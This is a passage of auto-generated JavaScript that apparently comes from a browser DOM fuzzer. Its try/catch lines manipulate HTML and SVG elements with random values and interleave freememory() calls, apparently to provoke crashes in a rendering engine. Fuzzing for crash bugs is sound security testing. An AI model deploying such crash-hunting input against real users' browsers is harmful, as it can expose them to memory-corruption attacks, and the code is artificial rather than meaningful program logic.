try { svgvar00010.setAttribute("gradientUnits", "userSpaceOnUse"); } catch(e) { }
try { var00248.setAttribute("onbegin", "var00010"); } catch(e) { }
try { htmlvar00038.setAttribute("can-process-drag", "false"); } catch(e) { }
try { /* newvar{var00258:HTMLButtonElement} */ var var00258 = document.createElement("button"); } catch(e) { }
try { if (!var00258) { var00258 = GetVariable(fuzzervars, 'HTMLButtonElement'); } else { SetVariable(var00258, 'HTMLButtonElement'); SetVariable(var00258, 'Element'); SetVariable(var00258, 'GlobalEventHandlers'); SetVariable(var00258, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00257:DOMString} */ var var00257 = var00258.formMethod; } catch(e) { }
try { htmlvar00022.requestFullscreen(); } catch(e) { }
try { /* newvar{var00259:Window} */ var var00259 = htmlvar00028.contentWindow; } catch(e) { }
try { if (!var00259) { var00259 = GetVariable(fuzzervars, 'Window'); } else { SetVariable(var00259, 'Window'); SetVariable(var00259, 'GlobalEventHandlers'); SetVariable(var00259, 'WindowBase64'); SetVariable(var00259, 'WindowEventHandlers'); SetVariable(var00259, 'WindowTimers'); SetVariable(var00259, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00260:SVGElement} */ var var00260 = var00110.lastChild; } catch(e) { }
try { if (!var00260) { var00260 = GetVariable(fuzzervars, 'SVGElement'); } else { SetVariable(var00260, 'SVGElement'); SetVariable(var00260, 'GlobalEventHandlers'); SetVariable(var00260, 'EventTarget'); SetVariable(var00260, 'GlobalEventHandlers');  } } catch(e) { }
try { var00134.setProperty("background-color", "green"); } catch(e) { }
try { svgvar00024.prepend("1"); } catch(e) { }
try { /* newvar{var00261:long} */ var var00261 = var00224.length; } catch(e) { }
try { /* newvar{var00262:HTMLIFrameElement} */ var var00262 = document.createElement("iframe"); } catch(e) { }
try { if (!var00262) { var00262 = GetVariable(fuzzervars, 'HTMLIFrameElement'); } else { SetVariable(var00262, 'HTMLIFrameElement'); SetVariable(var00262, 'Element'); SetVariable(var00262, 'GlobalEventHandlers'); SetVariable(var00262, 'EventTarget');  } } catch(e) { }
try { var00262.name = "" + String.fromCharCode(61, 40, 89, 108, 124, 81, 63, 72, 81, 97, 100, 45, 106, 83, 123, 32, 84, 92, 33, 114) + ""; } catch(e) { }
try { var00229.search = var00225; } catch(e) { }
try { var00025.setProperty("-webkit-mask-box-image-slice", "0"); } catch(e) { }
try { /* newvar{var00263:SVGRect} */ var var00263 = var00129.getExtentOfChar(66); } catch(e) { }
try { if (!var00263) { var00263 = GetVariable(fuzzervars, 'SVGRect'); } else { SetVariable(var00263, 'SVGRect');  } } catch(e) { }
try { htmlvar00011.ondrop = var00183; } catch(e) { }
try { /* newvar{var00265:HTMLOptionElement} */ var var00265 = document.createElement("option"); } catch(e) { }
try { if (!var00265) { var00265 = GetVariable(fuzzervars, 'HTMLOptionElement'); } else { SetVariable(var00265, 'HTMLOptionElement'); SetVariable(var00265, 'Element'); SetVariable(var00265, 'GlobalEventHandlers'); SetVariable(var00265, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00264:HTMLFormElement} */ var var00264 = var00265.form; } catch(e) { }
try { if (!var00264) { var00264 = GetVariable(fuzzervars, 'HTMLFormElement'); } else { SetVariable(var00264, 'HTMLFormElement'); SetVariable(var00264, 'Element'); SetVariable(var00264, 'GlobalEventHandlers'); SetVariable(var00264, 'EventTarget');  } } catch(e) { }
try { var00264.method = "get"; } catch(e) { }
try { htmlvar00014.setAttribute("item", "" + String.fromCharCode(114, 81, 116, 61, 45, 85, 75, 46, 34, 109, 125, 54, 90, 96, 118, 47, 42, 34, 89, 90) + ""); } catch(e) { }
try { /* newvar{var00266:NodeList} */ var var00266 = var00258.labels; } catch(e) { }
try { if (!var00266) { var00266 = GetVariable(fuzzervars, 'NodeList'); } else { SetVariable(var00266, 'NodeList');  } } catch(e) { }
try { /* newvar{var00267:boolean} */ var var00267 = var00027.composed; } catch(e) { }
try { var00201.setProperty("table-layout", "auto"); } catch(e) { }
try { /* newvar{var00268:HTMLFormElement} */ var var00268 = htmlvar00033.form; } catch(e) { }
try { if (!var00268) { var00268 = GetVariable(fuzzervars, 'HTMLFormElement'); } else { SetVariable(var00268, 'HTMLFormElement'); SetVariable(var00268, 'Element'); SetVariable(var00268, 'GlobalEventHandlers'); SetVariable(var00268, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00269:EventHandler} */ var var00269 = var00053.onauxclick; } catch(e) { }
try { if (!var00269) { var00269 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00269, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00270:Document} */ var var00270 = var00262.getSVGDocument(); } catch(e) { }
try { if (!var00270) { var00270 = GetVariable(fuzzervars, 'Document'); } else { SetVariable(var00270, 'Document'); SetVariable(var00270, 'GlobalEventHandlers'); SetVariable(var00270, 'DocumentOrShadowRoot');  } } catch(e) { }
try { /* newvar{var00271:boolean} */ var var00271 = document.execCommand("decreaseFontSize", false); } catch(e) { }
try { /* newvar{var00272:boolean} */ var var00272 = var00079.paused; } catch(e) { }
try { var00231.setAttribute("rows", "0"); } catch(e) { }
try { /* newvar{var00274:HTMLScriptElement} */ var var00274 = var00270.createElement("script"); } catch(e) { }
try { if (!var00274) { var00274 = GetVariable(fuzzervars, 'HTMLScriptElement'); } else { SetVariable(var00274, 'HTMLScriptElement'); SetVariable(var00274, 'Element'); SetVariable(var00274, 'GlobalEventHandlers'); SetVariable(var00274, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00273:DOMString} */ var var00273 = var00274.text; } catch(e) { }
try { /* newvar{var00277:XPathEvaluator} */ var var00277 = new XPathEvaluator(); } catch(e) { }
try { if (!var00277) { var00277 = GetVariable(fuzzervars, 'XPathEvaluator'); } else { SetVariable(var00277, 'XPathEvaluator');  } } catch(e) { }
try { /* newvar{var00276:XPathNSResolver} */ var var00276 = var00277.createNSResolver(htmlvar00002); } catch(e) { }
try { if (!var00276) { var00276 = GetVariable(fuzzervars, 'XPathNSResolver'); } else { SetVariable(var00276, 'XPathNSResolver');  } } catch(e) { }
try { /* newvar{var00275:XPathExpression} */ var var00275 = document.createExpression("//meter",var00276); } catch(e) { }
try { if (!var00275) { var00275 = GetVariable(fuzzervars, 'XPathExpression'); } else { SetVariable(var00275, 'XPathExpression');  } } catch(e) { }
try { /* newvar{var00278:EventHandler} */ var var00278 = htmlvar00026.onmouseenter; } catch(e) { }
try { if (!var00278) { var00278 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00278, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00279:boolean} */ var var00279 = htmlvar00020.checkValidity(); } catch(e) { }
try { var00018.icon = "" + String.fromCharCode(33, 47, 124, 118, 122, 126, 110, 37, 112, 96, 114, 103, 110, 46, 79, 78, 113, 103, 108, 94) + ""; } catch(e) { }
try { /* newvar{var00280:DOMString} */ var var00280 = var00122.languages; } catch(e) { }
try { var00223.length = 0; } catch(e) { }
try { /* newvar{var00281:SVGElement} */ var var00281 = var00040; } catch(e) { }
try { if (!var00281) { var00281 = GetVariable(fuzzervars, 'SVGElement'); } else { SetVariable(var00281, 'SVGElement'); SetVariable(var00281, 'GlobalEventHandlers'); SetVariable(var00281, 'EventTarget'); SetVariable(var00281, 'GlobalEventHandlers');  } } catch(e) { }
try { var00079.setAttribute("onprogress", "eventhandler4()"); } catch(e) { }
try { /* newvar{var00283:SVGViewSpec} */ var var00283 = svgvar00001.currentView; } catch(e) { }
try { if (!var00283) { var00283 = GetVariable(fuzzervars, 'SVGViewSpec'); } else { SetVariable(var00283, 'SVGViewSpec'); SetVariable(var00283, 'SVGFitToViewBox'); SetVariable(var00283, 'SVGZoomAndPan');  } } catch(e) { }
try { /* newvar{var00282:SVGElement} */ var var00282 = var00283.viewTarget; } catch(e) { }
try { if (!var00282) { var00282 = GetVariable(fuzzervars, 'SVGElement'); } else { SetVariable(var00282, 'SVGElement'); SetVariable(var00282, 'GlobalEventHandlers'); SetVariable(var00282, 'EventTarget'); SetVariable(var00282, 'GlobalEventHandlers');  } } catch(e) { }
try { /* newvar{var00284:boolean} */ var var00284 = var00178.closed; } catch(e) { }
try { /* newvar{var00285:Element} */ var var00285 = var00075.pointerLockElement; } catch(e) { }
try { if (!var00285) { var00285 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00285, 'Element'); SetVariable(var00285, 'GlobalEventHandlers'); SetVariable(var00285, 'EventTarget');  } } catch(e) { }
try { var00025.setProperty("-webkit-animation-duration", "0s"); } catch(e) { }
try { /* newvar{var00286:AnimationEventConstructor} */ var var00286 = var00001.WebKitAnimationEvent; } catch(e) { }
try { if (!var00286) { var00286 = GetVariable(fuzzervars, 'AnimationEventConstructor'); } else { SetVariable(var00286, 'AnimationEventConstructor');  } } catch(e) { }
try { var00025.setProperty("lighting-color", "rgb(28,64,196)"); } catch(e) { }
try { var00079.setAttribute("class", "class8"); } catch(e) { }
try { /* newvar{var00287:SVGPoint} */ var var00287 = svgvar00008.getPointAtLength(1); } catch(e) { }
try { if (!var00287) { var00287 = GetVariable(fuzzervars, 'SVGPoint'); } else { SetVariable(var00287, 'SVGPoint');  } } catch(e) { }
try { var00037.setAttribute("baseprofile", "full"); } catch(e) { }
try { /* newvar{var00288:DOMString} */ var var00288 = var00018.radiogroup; } catch(e) { }
try { htmlvar00004.deleteRow(0); } catch(e) { }
try { var00138.setProperty("scale", "0.61322152877 0 -1"); } catch(e) { }
try { /* newvar{var00289:DOMString} */ var var00289 = var00262.scrolling; } catch(e) { }
try { /* newvar{var00290:SVGMatrix} */ var var00290 = var00247.translate(0.493138225205,0.676848747982); } catch(e) { }
try { if (!var00290) { var00290 = GetVariable(fuzzervars, 'SVGMatrix'); } else { SetVariable(var00290, 'SVGMatrix');  } } catch(e) { }
try { var00216.setAttributeNS("http://www.w3.org/XML/1998/namespace", "xml:id", "svg-root"); } catch(e) { }
try { /* newvar{var00291:EventHandler} */ var var00291 = svgvar00008.ontouchend; } catch(e) { }
try { if (!var00291) { var00291 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00291, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00293:SecurityPolicyViolationEvent} */ var var00293 = document.createEvent("SecurityPolicyViolationEvent"); } catch(e) { }
try { if (!var00293) { var00293 = GetVariable(fuzzervars, 'SecurityPolicyViolationEvent'); } else { SetVariable(var00293, 'SecurityPolicyViolationEvent'); SetVariable(var00293, 'Event');  } } catch(e) { }
try { freememory(); } catch(e) { }
try { /* newvar{var00292:long} */ var var00292 = var00293.lineNumber; } catch(e) { }
try { var00016.setAttribute("aria-checked", "mixed"); } catch(e) { }
try { svgvar00018.setAttribute("clipPathUnits", "userSpaceOnUse"); } catch(e) { }
try { /* newvar{var00294:TreeWalker} */ var var00294 = var00270.createTreeWalker(htmlvar00023,0); } catch(e) { }
try { if (!var00294) { var00294 = GetVariable(fuzzervars, 'TreeWalker'); } else { SetVariable(var00294, 'TreeWalker');  } } catch(e) { }
try { var00274.setAttribute("target", "htmlvar00005"); } catch(e) { }
try { /* newvar{var00295:SVGAnimatedLength} */ var var00295 = svgvar00001.x; } catch(e) { }
try { if (!var00295) { var00295 = GetVariable(fuzzervars, 'SVGAnimatedLength'); } else { SetVariable(var00295, 'SVGAnimatedLength');  } } catch(e) { }
try { var00134.setProperty("transition-properties", "transform"); } catch(e) { }
try { htmlvar00030.setAttribute("classid", "" + String.fromCharCode(109, 53, 82, 41, 86, 81, 32, 35, 119, 104, 41, 101, 40, 81, 61, 112, 99, 37, 68, 98) + ""); } catch(e) { }
try { var00079.addEventListener("DOMNodeRemovedFromDocument", var00255); } catch(e) { }
try { htmlvar00027.alt = "" + String.fromCharCode(78, 121, 110, 103, 85, 47, 88, 53, 76, 32, 81, 110, 90, 46, 112, 83, 85, 88, 106, 112) + ""; } catch(e) { }
try { var00282.setAttribute("onclick", "var00010"); } catch(e) { }
try { /* newvar{var00296:MutationObserver} */ var var00296 = new MutationObserver(var00010); } catch(e) { }
try { if (!var00296) { var00296 = GetVariable(fuzzervars, 'MutationObserver'); } else { SetVariable(var00296, 'MutationObserver');  } } catch(e) { }
try { /* newvar{var00297:MutationObserverInit} */ var var00297 = {childList: true, attributes: false, characterData: true, subtree: true, attributeOldValue: true, characterDataOldValue: true}; } catch(e) { }
try { if (!var00297) { var00297 = GetVariable(fuzzervars, 'MutationObserverInit'); } else { SetVariable(var00297, 'MutationObserverInit');  } } catch(e) { }
try { var00296.observe(htmlvar00012,var00297); } catch(e) { }
try { /* newvar{var00298:boolean} */ var var00298 = var00214.reportValidity(); } catch(e) { }
try { var00078.preload = "auto"; } catch(e) { }
try { /* newvar{var00299:CSSStyleDeclaration} */ var var00299 = svgvar00008.style; } catch(e) { }
try { if (!var00299) { var00299 = GetVariable(fuzzervars, 'CSSStyleDeclaration'); } else { SetVariable(var00299, 'CSSStyleDeclaration');  } } catch(e) { }
try { var00299.setProperty("mso-protection", "locked visible"); } catch(e) { }
try { var00174.replaceWith(String.fromCharCode(69, 72, 112, 124, 33, 92, 34, 74, 62, 104, 117, 58, 90, 97, 73, 68, 52, 42, 102, 125)); } catch(e) { }
try { htmlvar00017.scope = "col"; } catch(e) { }
try { /* newvar{var00300:TimeRanges} */ var var00300 = var00079.buffered; } catch(e) { }
try { if (!var00300) { var00300 = GetVariable(fuzzervars, 'TimeRanges'); } else { SetVariable(var00300, 'TimeRanges');  } } catch(e) { }
try { /* newvar{var00301:HTMLAreaElement} */ var var00301 = document.createElement("area"); } catch(e) { }
try { if (!var00301) { var00301 = GetVariable(fuzzervars, 'HTMLAreaElement'); } else { SetVariable(var00301, 'HTMLAreaElement'); SetVariable(var00301, 'HTMLHyperlinkElementUtils'); SetVariable(var00301, 'Element'); SetVariable(var00301, 'GlobalEventHandlers'); SetVariable(var00301, 'EventTarget');  } } catch(e) { }
try { var00301.rel = "prev"; } catch(e) { }
try { /* newvar{var00302:EventHandler} */ var var00302 = htmlvar00007.onpointerup; } catch(e) { }
try { if (!var00302) { var00302 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00302, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00303:boolean} */ var var00303 = var00224.disabled; } catch(e) { }
try { var00064.addEventListener("DOMAttrModified", var00255); } catch(e) { }
try { /* newvar{var00304:DOMString} */ var var00304 = document.alinkColor; } catch(e) { }
try { /* newvar{var00305:boolean} */ var var00305 = var00274.async; } catch(e) { }
try { htmlvar00018.setAttribute("accesskey", "" + String.fromCharCode(51) + ""); } catch(e) { }
try { var00231.setAttribute("hspace", "1"); } catch(e) { }
try { svgvar00010.setAttribute("preserveAlpha", "false"); } catch(e) { }
try { svgvar00005.oncanplaythrough = var00160; } catch(e) { }
try { /* newvar{var00306:SVGElement} */ var var00306 = svgvar00009.viewportElement; } catch(e) { }
try { if (!var00306) { var00306 = GetVariable(fuzzervars, 'SVGElement'); } else { SetVariable(var00306, 'SVGElement'); SetVariable(var00306, 'GlobalEventHandlers'); SetVariable(var00306, 'EventTarget'); SetVariable(var00306, 'GlobalEventHandlers');  } } catch(e) { }
try { var00248.setAttribute("dominant-baseline", "auto"); } catch(e) { }
try { /* newvar{var00307:boolean} */ var var00307 = var00099.hasPointerCapture(-1); } catch(e) { }
try { var00299.setProperty("color-interpolation-filters", "sRGB"); } catch(e) { }
try { var00285.addEventListener("DOMElementNameChanged", var00255); } catch(e) { }
try { svgvar00008.addEventListener("DOMAttrModified", var00255); } catch(e) { }
try { svgvar00001.setAttribute("patternUnits", "objectBoundingBox"); } catch(e) { }
try { var00053.onpointerenter = var00115; } catch(e) { }
try { var00250.onlostpointercapture = var00222; } catch(e) { }
try { /* newvar{var00308:Element} */ var var00308 = var00054.iterateNext(); } catch(e) { }
try { if (!var00308) { var00308 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00308, 'Element'); SetVariable(var00308, 'GlobalEventHandlers'); SetVariable(var00308, 'EventTarget');  } } catch(e) { }
try { var00084.initTextEvent("foo"); } catch(e) { }
try { /* newvar{var00309:NativeScrollBehavior} */ var var00309 = "disable-native-scroll"; } catch(e) { }
try { if (!var00309) { var00309 = GetVariable(fuzzervars, 'NativeScrollBehavior'); } else { SetVariable(var00309, 'NativeScrollBehavior');  } } catch(e) { }
try { svgvar00023.setApplyScroll(var00009,var00309); } catch(e) { }
try { /* newvar{var00310:TimeRanges} */ var var00310 = var00079.seekable; } catch(e) { }
try { if (!var00310) { var00310 = GetVariable(fuzzervars, 'TimeRanges'); } else { SetVariable(var00310, 'TimeRanges');  } } catch(e) { }
try { var00263.width = 1; } catch(e) { }
try { var00250.before(var00112); } catch(e) { }
try { /* newvar{var00311:DOMString} */ var var00311 = htmlvar00007.abbr; } catch(e) { }
try { /* newvar{var00312:DOMString} */ var var00312 = htmlvar00024.standby; } catch(e) { }
try { /* newvar{var00313:svg_url_marker} */ var var00313 = "url(#" + var00252.id + ")"; } catch(e) { }
try { if (!var00313) { var00313 = GetVariable(fuzzervars, 'svg_url_marker'); } else { SetVariable(var00313, 'svg_url_marker');  } } catch(e) { }
try { freememory(); } catch(e) { }
try { htmlvar00024.setAttribute("aria-valuemax", "-1"); } catch(e) { }
try { var00025.setProperty("color-interpolation-filters", "sRGB"); } catch(e) { }
try { /* newvar{var00314:TreeWalker} */ var var00314 = document.createTreeWalker(htmlvar00035); } catch(e) { }
try { if (!var00314) { var00314 = GetVariable(fuzzervars, 'TreeWalker'); } else { SetVariable(var00314, 'TreeWalker');  } } catch(e) { }
try { /* newvar{var00315:boolean} */ var var00315 = var00058.altKey; } catch(e) { }
try { var00081.initMutationEvent("htmlvar00006",true,false,var00060,"foo","foo","1"); } catch(e) { }
try { htmlvar00018.clear = "none"; } catch(e) { }
try { var00201.setProperty("text-rendering", "auto"); } catch(e) { }
try { /* newvar{var00316:double} */ var var00316 = htmlvar00012.value; } catch(e) { }
try { /* newvar{var00317:ClientRectList} */ var var00317 = var00040.getClientRects(); } catch(e) { }
try { if (!var00317) { var00317 = GetVariable(fuzzervars, 'ClientRectList'); } else { SetVariable(var00317, 'ClientRectList');  } } catch(e) { }
try { svgvar00017.setAttribute("contentScriptType", "text/ecmascript"); } catch(e) { }
try { var00134.setProperty("min-height", "auto"); } catch(e) { }
try { /* newvar{var00318:double} */ var var00318 = var00166.clientY; } catch(e) { }
try { /* newvar{var00319:HTMLOrSVGScriptElement} */ var var00319 = document.currentScript; } catch(e) { }
try { if (!var00319) { var00319 = GetVariable(fuzzervars, 'HTMLOrSVGScriptElement'); } else { SetVariable(var00319, 'HTMLOrSVGScriptElement');  } } catch(e) { }
try { /* newvar{var00320:TextTrackCueList} */ var var00320 = var00047.activeCues; } catch(e) { }
try { if (!var00320) { var00320 = GetVariable(fuzzervars, 'TextTrackCueList'); } else { SetVariable(var00320, 'TextTrackCueList');  } } catch(e) { }
try { var00086.setProperty("-webkit-animation", "anim 0s alternate"); } catch(e) { }
try { /* newvar{var00321:boolean} */ var var00321 = svgvar00014.isEqualNode(svgvar00018); } catch(e) { }
try { /* newvar{var00322:EventHandler} */ var var00322 = var00038.onobsolete; } catch(e) { }
try { if (!var00322) { var00322 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00322, 'EventHandler');  } } catch(e) { }
try { htmlvar00008.onemptied = var00167; } catch(e) { }
try { var00223.add(var00153,0); } catch(e) { }
try { var00086.setProperty("-webkit-border-end-width", "8px"); } catch(e) { }
try { var00229.href = var00173; } catch(e) { }
try { var00224.add(var00265); } catch(e) { }
try { /* newvar{var00323:DOMString} */ var var00323 = var00179.getAttribute("encoding"); } catch(e) { }
try { /* newvar{var00324:CSSStyleDeclaration} */ var var00324 = htmlvar00016.style; } catch(e) { }
try { if (!var00324) { var00324 = GetVariable(fuzzervars, 'CSSStyleDeclaration'); } else { SetVariable(var00324, 'CSSStyleDeclaration');  } } catch(e) { }
try { var00248.setAttribute("max", "media"); } catch(e) { }
try { var00201.setProperty("border-image-width", "1"); } catch(e) { }
try { /* newvar{var00325:EventTarget} */ var var00325 = var00117; } catch(e) { }
try { if (!var00325) { var00325 = GetVariable(fuzzervars, 'EventTarget'); } else { SetVariable(var00325, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00327:SVGPatternElement} */ var var00327 = document.createElementNS("http://www.w3.org/2000/svg", "pattern"); } catch(e) { }
try { if (!var00327) { var00327 = GetVariable(fuzzervars, 'SVGPatternElement'); } else { SetVariable(var00327, 'SVGPatternElement'); SetVariable(var00327, 'SVGFitToViewBox'); SetVariable(var00327, 'SVGURIReference'); SetVariable(var00327, 'SVGTests'); SetVariable(var00327, 'SVGElement'); SetVariable(var00327, 'GlobalEventHandlers'); SetVariable(var00327, 'EventTarget'); SetVariable(var00327, 'GlobalEventHandlers');  } } catch(e) { }
try { /* newvar{var00326:svg_url_fill} */ var var00326 = "url(#" + var00327.id + ")"; } catch(e) { }
try { if (!var00326) { var00326 = GetVariable(fuzzervars, 'svg_url_fill'); } else { SetVariable(var00326, 'svg_url_fill');  } } catch(e) { }
try { var00306.setAttribute("fill", var00326); } catch(e) { }
try { var00324.setProperty("list-style-type", "telugu"); } catch(e) { }
try { /* newvar{var00328:EventHandler} */ var var00328 = var00306.oncopy; } catch(e) { }
try { if (!var00328) { var00328 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00328, 'EventHandler');  } } catch(e) { }
try { var00324.setProperty("background-color", "black"); } catch(e) { }
try { var00064.vspace = 1; } catch(e) { }
try { /* newvar{var00330:sequence_Dictionary_} */ var var00330 = { "-webkit-ruby-position": [32, 0] }; } catch(e) { }
try { if (!var00330) { var00330 = GetVariable(fuzzervars, 'sequence_Dictionary_'); } else { SetVariable(var00330, 'sequence_Dictionary_');  } } catch(e) { }
try { /* newvar{var00329:Animation} */ var var00329 = var00193.animate(var00330,0.215558145371); } catch(e) { }
try { if (!var00329) { var00329 = GetVariable(fuzzervars, 'Animation'); } else { SetVariable(var00329, 'Animation'); SetVariable(var00329, 'EventTarget');  } } catch(e) { }
try { var00265.addEventListener("DOMNodeInsertedIntoDocument", var00021); } catch(e) { }
try { /* newvar{var00331:Attr} */ var var00331 = var00037.getAttributeNodeNS("http://www.w3.org/1999/xhtml","coords"); } catch(e) { }
try { if (!var00331) { var00331 = GetVariable(fuzzervars, 'Attr'); } else { SetVariable(var00331, 'Attr');  } } catch(e) { }
try { var00247.d = 0.158070730567; } catch(e) { }
try { /* newvar{var00332:boolean} */ var var00332 = document.execCommand("createLink", false, "#foo"); } catch(e) { }
try { var00274.charset = "US-ASCII"; } catch(e) { }
try { var00086.setProperty("border-image", "url(data:image/gif;base64,R0lGODlhEAAQAMQAAORHHOVSKudfOulrSOp3WOyDZu6QdvCchPGolfO0o/XBs/fNwfjZ0frl3/zy7////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkAABAALAAAAAAQABAAAAVVICSOZGlCQAosJ6mu7fiyZeKqNKToQGDsM8hBADgUXoGAiqhSvp5QAnQKGIgUhwFUYLCVDFCrKUE1lBavAViFIDlTImbKC5Gm2hB0SlBCBMQiB0UjIQA7) 0 1 0 1 fill/0px 1px 1px 0px"); } catch(e) { }
try { /* newvar{var00333:USVString} */ var var00333 = var00102.port; } catch(e) { }
try { if (!var00333) { var00333 = GetVariable(fuzzervars, 'USVString'); } else { SetVariable(var00333, 'USVString');  } } catch(e) { }
try { /* newvar{var00334:EventHandler} */ var var00334 = var00193.onrejectionhandled; } catch(e) { }
try { if (!var00334) { var00334 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00334, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00335:Window} */ var var00335 = var00178[40%var00178.length]; } catch(e) { }
try { if (!var00335) { var00335 = GetVariable(fuzzervars, 'Window'); } else { SetVariable(var00335, 'Window'); SetVariable(var00335, 'GlobalEventHandlers'); SetVariable(var00335, 'WindowBase64'); SetVariable(var00335, 'WindowEventHandlers'); SetVariable(var00335, 'WindowTimers'); SetVariable(var00335, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00336:boolean} */ var var00336 = var00005.isContentEditable; } catch(e) { }
try { var00258.setAttribute("aria-dropeffect", "none"); } catch(e) { }
try { var00025.setProperty("font", "bold 0.529738820333cm/0em 'Verdana'"); } catch(e) { }
try { /* newvar{var00337:EventHandler} */ var var00337 = var00193.onbeforeunload; } catch(e) { }
try { if (!var00337) { var00337 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00337, 'EventHandler');  } } catch(e) { }
try { var00265.text = ""; } catch(e) { }
try { var00327.scroll(); } catch(e) { }
try { htmlvar00035.setAttribute("title", "" + String.fromCharCode(113, 72, 115, 39, 107, 48, 60, 114, 54, 122, 99, 75, 59, 86, 68, 96, 109, 81, 55, 74) + ""); } catch(e) { }
try { /* newvar{var00338:double} */ var var00338 = var00078.playbackRate; } catch(e) { }
try { /* newvar{var00339:DOMString} */ var var00339 = var00214.method; } catch(e) { }
try { var00025.setProperty("cx", "0px"); } catch(e) { }
try { var00324.setProperty("word-wrap", "normal"); } catch(e) { }
try { var00037.setAttribute("aria-level", "3"); } catch(e) { }
try { var00005.username = var00333; } catch(e) { }
try { var00201.setProperty("vertical-align", "text-bottom"); } catch(e) { }
try { /* newvar{var00340:TextTrackCueList} */ var var00340 = var00047.activeCues; } catch(e) { }
try { if (!var00340) { var00340 = GetVariable(fuzzervars, 'TextTrackCueList'); } else { SetVariable(var00340, 'TextTrackCueList');  } } catch(e) { }
try { htmlvar00007.height = "4"; } catch(e) { }
try { /* newvar{var00341:TouchList} */ var var00341 = document.createTouchList(var00166); } catch(e) { }
try { if (!var00341) { var00341 = GetVariable(fuzzervars, 'TouchList'); } else { SetVariable(var00341, 'TouchList');  } } catch(e) { }
try { /* newvar{var00344:HTMLOutputElement} */ var var00344 = document.createElement("output"); } catch(e) { }
try { if (!var00344) { var00344 = GetVariable(fuzzervars, 'HTMLOutputElement'); } else { SetVariable(var00344, 'HTMLOutputElement'); SetVariable(var00344, 'Element'); SetVariable(var00344, 'GlobalEventHandlers'); SetVariable(var00344, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00343:ValidityState} */ var var00343 = var00344.validity; } catch(e) { }
try { if (!var00343) { var00343 = GetVariable(fuzzervars, 'ValidityState'); } else { SetVariable(var00343, 'ValidityState');  } } catch(e) { }
try { /* newvar{var00342:boolean} */ var var00342 = var00343.tooLong; } catch(e) { }
try { var00025.setProperty("line-break", "before-white-space"); } catch(e) { }
try { /* newvar{var00349:DragEvent} */ var var00349 = document.createEvent("DragEvent"); } catch(e) { }
try { if (!var00349) { var00349 = GetVariable(fuzzervars, 'DragEvent'); } else { SetVariable(var00349, 'DragEvent'); SetVariable(var00349, 'MouseEvent'); SetVariable(var00349, 'UIEvent'); SetVariable(var00349, 'Event');  } } catch(e) { }
try { /* newvar{var00348:DataTransfer} */ var var00348 = var00349.dataTransfer; } catch(e) { }
try { if (!var00348) { var00348 = GetVariable(fuzzervars, 'DataTransfer'); } else { SetVariable(var00348, 'DataTransfer');  } } catch(e) { }
try { /* newvar{var00347:DataTransferItemList} */ var var00347 = var00348.items; } catch(e) { }
try { if (!var00347) { var00347 = GetVariable(fuzzervars, 'DataTransferItemList'); } else { SetVariable(var00347, 'DataTransferItemList');  } } catch(e) { }
try { /* newvar{var00350:File} */ var var00350 = new File(["foo"], String.fromCharCode(124, 77, 77, 41, 97, 62, 79, 120, 39, 73, 81, 38, 39, 88, 48, 32, 94, 116, 105, 108)); } catch(e) { }
try { if (!var00350) { var00350 = GetVariable(fuzzervars, 'File'); } else { SetVariable(var00350, 'File');  } } catch(e) { }
try { /* newvar{var00346:DataTransferItem} */ var var00346 = var00347.add(var00350); } catch(e) { }
try { if (!var00346) { var00346 = GetVariable(fuzzervars, 'DataTransferItem'); } else { SetVariable(var00346, 'DataTransferItem');  } } catch(e) { }
try { /* newvar{var00345:Blob} */ var var00345 = var00346.getAsFile(); } catch(e) { }
try { if (!var00345) { var00345 = GetVariable(fuzzervars, 'Blob'); } else { SetVariable(var00345, 'Blob');  } } catch(e) { }
try { var00128.set(var00173,var00345,var00173); } catch(e) { }
try { var00260.setAttribute("tableValues", "-1 1 81 0"); } catch(e) { }
try { /* newvar{var00351:Element} */ var var00351 = htmlvar00035; } catch(e) { }
try { if (!var00351) { var00351 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00351, 'Element'); SetVariable(var00351, 'GlobalEventHandlers'); SetVariable(var00351, 'EventTarget');  } } catch(e) { }
try { svgvar00009.onend = var00235; } catch(e) { }
try { document.all[16%document.all.length].appendChild(htmlvar00017); } catch(e) { }
try { /* newvar{var00359:HTMLEmbedElement} */ var var00359 = document.createElement("embed"); } catch(e) { }
try { if (!var00359) { var00359 = GetVariable(fuzzervars, 'HTMLEmbedElement'); } else { SetVariable(var00359, 'HTMLEmbedElement'); SetVariable(var00359, 'Element'); SetVariable(var00359, 'GlobalEventHandlers'); SetVariable(var00359, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00358:Document} */ var var00358 = var00359.getSVGDocument(); } catch(e) { }
try { if (!var00358) { var00358 = GetVariable(fuzzervars, 'Document'); } else { SetVariable(var00358, 'Document'); SetVariable(var00358, 'GlobalEventHandlers'); SetVariable(var00358, 'DocumentOrShadowRoot');  } } catch(e) { }
try { /* newvar{var00357:Text} */ var var00357 = var00358.createTextNode(String.fromCodePoint(190948, 544152, 482564, 772800, 470965, 924540, 78891, 698689, 293806, 815114, 1079004, 243911, 306260, 681087, 1013880, 636360, 133581, 238582, 144508, 1060852)); } catch(e) { }
